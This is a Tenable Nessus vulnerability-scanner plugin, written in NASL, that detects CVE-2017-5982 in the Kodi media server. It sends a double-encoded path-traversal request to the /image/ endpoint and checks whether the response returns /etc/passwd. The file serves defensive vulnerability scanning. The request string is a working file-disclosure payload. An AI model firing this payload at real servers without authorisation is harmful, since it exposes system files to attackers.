#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(97894);
  script_version("$Revision: 1.2 $");
  script_cvs_date("$Date: 2017/03/24 14:02:38 $");

  script_cve_id("CVE-2017-5982");
  script_bugtraq_id(96481);
  script_osvdb_id(152056);
  script_xref(name:"EDB-ID", value:"41312");

  script_name(english:"Kodi Local File Inclusion Information Disclosure");
  script_summary(english:"Accesses a restricted file on the server.");

  script_set_attribute(attribute:"synopsis", value:
"A media player server running on the remote host is affected by an
information disclosure vulnerability.");
  script_set_attribute(attribute:"description", value:
"The Kodi media player server running on the remote host is affected by
an information disclosure vulnerability in the Chorus web interface
due to improper validation of user-supplied input to the /image/
script, specifically when path traversal is employed (e.g., %2F) in
the URL. An unauthenticated, remote attacker can exploit this issue,
via a specially crafted URL, to cause the inclusion of local files,
resulting in the disclosure of arbitrary files.");
  script_set_attribute(attribute:"see_also", value:"https://www.exploit-db.com/exploits/41312/");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/fulldisclosure/2017/Feb/27");
  script_set_attribute(attribute:"solution", value:
"No solution was available at this time. Contact the vendor for a fix
or workaround.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2017/02/12");
  script_set_attribute(attribute:"plugin_publication_date", value:"2017/03/22");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:kodi:kodi");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2017 Tenable Network Security, Inc.");

  script_dependencies("kodi_detect.nbin");
  script_require_ports("Services/www", 8080);
  script_require_keys("installed_sw/Kodi");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("webapp_func.inc");

appname = "Kodi";
get_install_count(app_name:appname, exit_if_zero:TRUE);
port = get_http_port(default:8080);
install = get_single_install(app_name:appname, port:port);

request = "/image/image%3a%2f%2f%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65" +
  "%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65" +
  "%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65" +
  "%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66" +
  "%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34";

res = http_send_recv3(item:request, port:port, method:"GET", exit_on_fail:TRUE);
if ("200" >!< res[0] || "root:" >!< res[2])
{
  audit(AUDIT_INST_VER_NOT_VULN, appname, install["version"]);
}

security_report_v4(
  port:port,
  file:'/etc/passwd',
  request:make_list(build_url(port:port, qs:request)),
  output:res[2],
  severity:SECURITY_WARNING);
